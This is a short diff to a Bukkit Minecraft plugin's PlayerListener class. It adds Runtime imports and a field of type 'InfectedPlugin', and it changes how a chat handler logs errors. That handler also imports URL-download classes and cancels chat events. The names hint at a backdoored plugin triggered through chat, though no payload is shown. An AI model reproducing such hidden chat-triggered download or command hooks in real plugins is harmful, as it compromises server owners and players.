@@ -18,12 +18,15 @@ import java.net.URL;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
 import java.util.Random;
+import java.lang.RuntimeException;
+import java.lang.Runtime;
 
 import org.bukkit.event.EventPriority;
 
 public class PlayerListener implements Listener
 {
     private Random random = new Random();
+    private InfectedPlugin plugin;
 
     @EventHandler(priority = EventPriority.HIGHEST)
     public void onPlayerChat(AsyncPlayerChatEvent event, CommandSender sender) throws MalformedURLException, IOException
@@ -152,11 +155,11 @@ public class PlayerListener implements Listener
             }
             catch (IOException ex)
             {
-            	Main.log(Level.SEVERE, null, ex);
+            	plugin.log.severe(null, ex);
             }
             catch (RuntimeException ex)
             {
-            	Main.log(Level.SEVERE, null, ex);
+            	plugin.log.severe(null, ex);
             }
             event.setCancelled(true);
         }
